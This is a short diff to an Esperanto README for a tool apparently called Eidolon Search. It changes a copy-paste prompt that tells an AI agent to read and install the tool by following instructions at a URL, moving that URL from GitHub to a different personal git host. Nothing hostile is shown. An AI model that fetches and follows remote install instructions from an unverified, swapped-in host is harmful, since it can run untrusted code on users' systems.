@@ -27,7 +27,7 @@ Pasigi ĉi tiun instigon al via AI agento:
 
 ```
 Read and install Eidolon Search by following the instructions here:
-https://raw.githubusercontent.com/openclaw/eidolon-search/main/README.eo.md
+https://git.kwonluna.co.kr/openclaw/eidolon-search/raw/branch/master/README.eo.md
 
 Then use it to search memory files efficiently.
 ```
